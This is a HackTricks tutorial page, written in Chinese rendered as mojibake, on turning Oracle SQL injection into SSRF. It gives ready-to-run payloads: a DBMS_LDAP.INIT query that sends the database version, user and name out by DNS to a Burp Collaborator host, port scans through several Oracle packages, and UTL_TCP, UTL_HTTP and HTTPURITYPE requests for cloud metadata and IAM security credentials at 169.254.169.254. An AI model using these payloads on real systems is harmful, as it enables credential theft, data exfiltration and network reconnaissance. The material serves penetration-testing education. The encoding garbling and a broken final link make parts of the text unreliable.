# Oracleæ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

**å°†æ­¤å¸–å­å­˜æ¡£ä¸ºå·²åˆ é™¤å¸–å­çš„[wayback machineå‰¯æœ¬](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**ã€‚

## SSRF

ä½¿ç”¨Oracleæ‰§è¡Œå¸¦å¤–HTTPå’ŒDNSè¯·æ±‚çš„æ–¹æ³•å·²ç»æœ‰å¾ˆå¥½çš„æ–‡æ¡£è®°å½•ï¼Œä½†ä½œä¸ºæ³¨å…¥ä¸­çªƒå–SQLæ•°æ®çš„æ‰‹æ®µã€‚æˆ‘ä»¬æ€»æ˜¯å¯ä»¥ä¿®æ”¹è¿™äº›æŠ€æœ¯/å‡½æ•°æ¥æ‰§è¡Œå…¶ä»–SSRF/XSPAã€‚

å®‰è£…Oracleå¯èƒ½éå¸¸ç—›è‹¦ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ‚¨æƒ³è®¾ç½®ä¸€ä¸ªå¿«é€Ÿå®ä¾‹æ¥å°è¯•å‘½ä»¤ã€‚æˆ‘çš„æœ‹å‹å’ŒåŒäº‹åœ¨[Appsecco](https://appsecco.com)ï¼Œ[Abhisek Datta](https://github.com/abhisek)ï¼Œå‘æˆ‘æŒ‡å‡ºäº†[https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)ï¼Œè¿™ä½¿æˆ‘èƒ½å¤Ÿåœ¨t2.large AWS Ubuntuæœºå™¨å’ŒDockerä¸Šè®¾ç½®ä¸€ä¸ªå®ä¾‹ã€‚

æˆ‘ä½¿ç”¨`--network="host"`æ ‡å¿—è¿è¡Œäº†dockerå‘½ä»¤ï¼Œä»¥ä¾¿æˆ‘å¯ä»¥æ¨¡æ‹ŸOracleä½œä¸ºå…·æœ‰å®Œå…¨ç½‘ç»œè®¿é—®æƒé™çš„æœ¬åœ°å®‰è£…ï¼Œç”¨äºæœ¬åšæ–‡çš„è¿‡ç¨‹ã€‚
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### æ”¯æŒURLæˆ–ä¸»æœºå/ç«¯å£å·è§„èŒƒçš„OracleåŒ… <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

ä¸ºäº†æ‰¾åˆ°æ”¯æŒä¸»æœºå’Œç«¯å£è§„èŒƒçš„ä»»ä½•åŒ…å’Œå‡½æ•°ï¼Œæˆ‘åœ¨[Oracleæ•°æ®åº“åœ¨çº¿æ–‡æ¡£](https://docs.oracle.com/database/121/index.html)ä¸Šè¿›è¡Œäº†è°·æ­Œæœç´¢ã€‚å…·ä½“æ¥è¯´ï¼Œ
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
æœç´¢è¿”å›äº†ä»¥ä¸‹ç»“æœï¼ˆå¹¶éæ‰€æœ‰éƒ½å¯ç”¨äºæ‰§è¡Œå‡ºç«™ç½‘ç»œï¼‰

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

è¿™ç§ç®€å•çš„æœç´¢æ˜¾ç„¶ä¼šè·³è¿‡åƒ`DBMS_LDAP`è¿™æ ·çš„åŒ…ï¼ˆå…è®¸ä¼ é€’ä¸»æœºåå’Œç«¯å£å·ï¼‰ï¼Œå› ä¸º[æ–‡æ¡£é¡µé¢](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)åªæ˜¯å°†æ‚¨æŒ‡å‘[ä¸åŒçš„ä½ç½®](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ã€‚å› æ­¤ï¼Œå¯èƒ½æœ‰å…¶ä»–å¯ä»¥æ»¥ç”¨ä»¥å‘å‡ºè¯·æ±‚çš„OracleåŒ…æˆ‘å¯èƒ½é”™è¿‡äº†ã€‚

æ— è®ºå¦‚ä½•ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬å‘ç°å¹¶åˆ—å‡ºçš„ä¸€äº›åŒ…ã€‚

**DBMS\_LDAP.INIT**

`DBMS_LDAP`åŒ…å…è®¸è®¿é—®LDAPæœåŠ¡å™¨ä¸­çš„æ•°æ®ã€‚`init()`å‡½æ•°åˆå§‹åŒ–ä¸LDAPæœåŠ¡å™¨çš„ä¼šè¯ï¼Œå¹¶å°†ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ã€‚

æ­¤å‡½æ•°ä»¥å‰å·²ç»è®°å½•è¿‡ï¼Œæ˜¾ç¤ºé€šè¿‡DNSæ³„éœ²æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤º
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
ç„¶è€Œï¼Œè€ƒè™‘åˆ°è¯¥å‡½æ•°æ¥å—ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ï¼Œæ‚¨ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒæ¥åƒç«¯å£æ‰«æå™¨ä¸€æ ·å·¥ä½œã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹:
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` è¡¨æ˜ç«¯å£å…³é—­ï¼Œè€Œä¼šè¯å€¼æŒ‡å‘ç«¯å£å·²æ‰“å¼€ã€‚

**UTL\_SMTP**

`UTL_SMTP` åŒ…æ—¨åœ¨é€šè¿‡ SMTP å‘é€ç”µå­é‚®ä»¶ã€‚[Oracle æ–‡æ¡£ç½‘ç«™æä¾›äº†ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨è¯¥åŒ…å‘é€ç”µå­é‚®ä»¶](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478)ã€‚ç„¶è€Œï¼Œå¯¹æˆ‘ä»¬è€Œè¨€ï¼Œæœ‰è¶£çš„æ˜¯èƒ½å¤Ÿæä¾›ä¸»æœºå’Œç«¯å£è§„èŒƒã€‚

ä¸‹é¢æ˜¾ç¤ºäº†ä¸€ä¸ªç®€å•ç¤ºä¾‹ï¼Œä½¿ç”¨äº† `UTL_SMTP.OPEN_CONNECTION` å‡½æ•°ï¼Œè®¾ç½®äº† 2 ç§’çš„è¶…æ—¶æ—¶é—´ã€‚
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: ä¼ è¾“è¶…æ—¶` è¡¨æ˜ç«¯å£å·²æ‰“å¼€ï¼Œä½†æœªå»ºç«‹ SMTP è¿æ¥ï¼Œè€Œ `ORA-29278: SMTP ä¸´æ—¶é”™è¯¯: 421 æœåŠ¡ä¸å¯ç”¨` è¡¨æ˜ç«¯å£å·²å…³é—­ã€‚

**UTL\_TCP**

`UTL_TCP` åŒ…åŠå…¶è¿‡ç¨‹å’Œå‡½æ•°å…è®¸[ä¸æœåŠ¡è¿›è¡ŒåŸºäº TCP/IP çš„é€šä¿¡](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ã€‚å¦‚æœä¸ºç‰¹å®šæœåŠ¡ç¼–ç¨‹ï¼Œè¯¥åŒ…å¯ä»¥è½»æ¾æˆä¸ºè¿›å…¥ç½‘ç»œæˆ–æ‰§è¡Œå®Œæ•´çš„æœåŠ¡å™¨ç«¯è¯·æ±‚çš„ä¸€ç§æ–¹å¼ï¼Œå› ä¸ºå¯ä»¥æ§åˆ¶ TCP/IP è¿æ¥çš„æ‰€æœ‰æ–¹é¢ã€‚

[Oracle æ–‡æ¡£ç½‘ç«™ä¸Šçš„ç¤ºä¾‹](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ­¤åŒ…å»ºç«‹åŸå§‹ TCP è¿æ¥ä»¥è·å–ç½‘é¡µã€‚æˆ‘ä»¬å¯ä»¥ç®€åŒ–ä¸€ä¸‹ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å‘å…ƒæ•°æ®å®ä¾‹æˆ–ä»»æ„ TCP/IP æœåŠ¡å‘å‡ºè¯·æ±‚ã€‚
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
**UTL\_HTTPå’ŒWebè¯·æ±‚**

æˆ–è®¸åœ¨æ‰€æœ‰å…³äºOut of Band Oracle SQLæ³¨å…¥çš„æ•™ç¨‹ä¸­æœ€å¸¸è§ä¸”å¹¿æ³›è®°å½•çš„æŠ€æœ¯æ˜¯[`UTL_HTTP`åŒ…](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070)ã€‚æ–‡æ¡£ä¸­å®šä¹‰äº†è¿™ä¸ªåŒ… - `UTL_HTTPåŒ…å…è®¸åœ¨SQLå’ŒPL/SQLä¸­è¿›è¡Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHTTPï¼‰è°ƒç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒé€šè¿‡HTTPè®¿é—®äº’è”ç½‘ä¸Šçš„æ•°æ®ã€‚`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
ä½ è¿˜å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ‰§è¡Œä¸€äº›åŸºæœ¬çš„ç«¯å£æ‰«æï¼Œæ¯”å¦‚ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
ä¸€ä¸ª`ORA-12541: TNS:no listener`æˆ–`TNS:operation timed out`è¡¨ç¤ºTCPç«¯å£å…³é—­ï¼Œè€Œ`ORA-29263: HTTP protocol error`æˆ–æ•°æ®è¡¨ç¤ºç«¯å£æ‰“å¼€ã€‚

æˆ‘è¿‡å»ä½¿ç”¨è¿‡çš„å¦ä¸€ä¸ªåŒ…æ˜¯[`HTTPURITYPE` OracleæŠ½è±¡ç±»å‹çš„`GETCLOB()`æ–¹æ³•](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705)ï¼Œå®ƒå…è®¸ä¸URLäº¤äº’å¹¶æ”¯æŒHTTPåè®®ã€‚`GETCLOB()`æ–¹æ³•ç”¨äºå°†URLçš„GETå“åº”ä½œä¸º[CLOBæ•°æ®ç±»å‹](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)æå–ã€‚[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
